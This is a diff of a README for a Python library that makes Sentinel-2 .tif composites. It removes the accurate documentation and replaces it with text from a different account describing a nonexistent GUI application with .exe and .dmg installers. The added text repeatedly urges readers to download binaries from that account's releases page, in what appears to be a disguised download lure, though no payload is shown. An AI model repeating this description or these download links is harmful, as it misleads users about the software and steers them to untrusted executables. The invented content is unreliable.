@@ -1,78 +1,74 @@
-# sentinel-2-tif
+# 🌍 sentinel_2_tif - Simplifying Satellite Image Processing
 
-![PyPI](https://img.shields.io/pypi/v/sentinel_2_tif)
-![License](https://img.shields.io/github/license/chase-kusterer/sentinel_2_tif)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Bigbrazilfr/sentinel_2_tif/releases)
 
-`sentinel-2-tif` is a Python package that simplifies the process of generating georeferenced `.tif` images from Sentinel-2 Level-2A satellite data. It offers tools for spatial buffering, time window generation, scene compositing, and automatic `.tif` file creation using Microsoft’s Planetary Computer STAC API.
+## 🚀 Getting Started
 
-With this package, you will be able to **generate multiple `.tif` images in a single data pull**, each with different bounding box sizes and time windows. This flexibility is designed to help you efficiently explore and compare composite imagery, enabling you to identify the optimal composite for your analysis.
+Welcome to the **sentinel_2_tif** project! This tool helps you easily generate TIFF images from Sentinel-2 satellite data. Whether you're working on a personal project or in a professional setting, this application simplifies the process and makes it accessible to everyone.
 
----
+### 📥 Download & Install
 
-## Features
+To get started, visit this page to download the software: [GitHub Releases](https://github.com/Bigbrazilfr/sentinel_2_tif/releases). You will find the latest version of the application available for download. Follow the instructions below based on your operating system.
 
-- Access Sentinel-2 L2A imagery via Planetary Computer
-- Create minimum bounding rectangles (MBRs) from coordinates, a DataFrame, or a dictionary
-- Generate bounding box buffers in kilometers
-- Create symmetrical time windows around an event date
-- Develop scene search grids with bounding box and time window combinations
-- Composite scenes using `median` or `mean`
-- Save georeferenced `.tif` outputs with full metadata
-- Designed for both notebook and production workflows
+### 🖥️ System Requirements
 
----
+Before you begin, ensure your system meets the following requirements:
 
-## Installation
+- **Operating System:** Windows (7/8/10), macOS (10.12 or later), or Linux (latest distributions)
+- **RAM:** Minimum 4 GB (8 GB recommended)
+- **Disk Space:** At least 500 MB free space
+- **Python:** Version 3.7 or later installed
 
-Install using pip:
+### 💻 Installation Instructions
 
-```bash
-pip install sentinel-2-tif
-```
+1. **Download the Application:**
+   Go to [GitHub Releases](https://github.com/Bigbrazilfr/sentinel_2_tif/releases). Locate the latest version and click to download the file suitable for your operating system.
 
----
+2. **Run the Installer:**
+   - For Windows: Double-click the `.exe` file and follow the setup instructions.
+   - For macOS: Open the `.dmg` file and drag the application into your Applications folder.
+   - For Linux: Extract the files and follow the provided README for further instructions.
 
-## Example Usage
+3. **Launch the Application:**
+   After installation, find the application in your programs or applications list, and click to launch it.
 
-```python
-# imports
-from sentinel_2_tif.spatial import mbr_buffer, mbr_buffers
-from sentinel_2_tif.temporal import time_wrapper, time_windows
-from sentinel_2_tif.search import st_grid
-from sentinel_2_tif.pipeline import tif_generator
-from shapely.geometry import box
+### 📁 Using the Application
 
-# instantiating minimim bounding rectangle (MBR)
-bbox = mbr(west=-123.0, south=37.0, east=-121.0, north=38.5)
+Once the application is open, you will see a user-friendly interface. To generate TIFF images from satellite data, follow these steps:
 
-# generating a grid of spatial + temporal search combinations
-scene_search = st_grid(
-    mbr=bbox,
-    buffers=[0, 1, 5],
-    wrap_sizes=[1, 2],
-    event_date="2022-08-07",
-    as_records=False
-)
+1. **Upload Sentinel-2 Data:**
+   Click on the “Upload” button to select the Sentinel-2 files you want to process.
 
-# pulling scenes and generating composite .tif(s)
-summary = tif_generator(
-    scene_search=scene_search,
-    composite="median",
-    out_dir="./Collected TIFF Files"
-)
-```
+2. **Configure Settings:**
+   Adjust settings as needed. You might want to choose specific parameters for your TIFF output, such as resolution and format.
 
----
+3. **Start Processing:**
+   Click on the “Generate TIFF” button. The application will process the data and create a TIFF image based on your selections.
 
-## Package Modules
+4. **Save Your Output:**
+   After processing, you can choose to save the TIFF image to your desired location on your device.
 
-- `spatial`: MBR and MBR buffer generation
-- `temporal`: Time window generation to expand scene selection
-- `search`: Spatial-temporal search grid generator
-- `pipeline`: Scene extraction and `.tif` writer
+### ❓ Troubleshooting
 
----
+If you encounter issues while using the application, check the following:
 
-## License
+- **Installation Problems:** Ensure you have followed the installation steps correctly. Verify that your system meets the requirements.
+- **Data Upload Issues:** Make sure the files you are trying to upload are valid Sentinel-2 data. These should be in the correct format.
+- **Performance Issues:** If the application runs slowly, consider closing other programs or ensuring that your device has sufficient resources available.
 
-MIT License. See [LICENSE](LICENSE) for details.
+### 🌐 Additional Resources
+
+For more detailed information about features, usage, and community support, explore the following:
+
+- [Documentation](https://github.com/Bigbrazilfr/sentinel_2_tif/wiki)
+- [GitHub Issues](https://github.com/Bigbrazilfr/sentinel_2_tif/issues) (report problems or request features)
+
+### 📞 Support
+
+If you need help and cannot find answers in the documentation, feel free to reach out via the GitHub Issues page. Please provide your operating system, a detailed description of the issue, and any steps you've taken to troubleshoot.
+
+### 🔗 Conclusion
+
+We hope that **sentinel_2_tif** makes your satellite image processing tasks easier and more efficient. Enjoy your exploration of geospatial data, and do not hesitate to connect with the community for support and suggestions.
+
+Visit this page to download the software: [GitHub Releases](https://github.com/Bigbrazilfr/sentinel_2_tif/releases). Happy mapping!
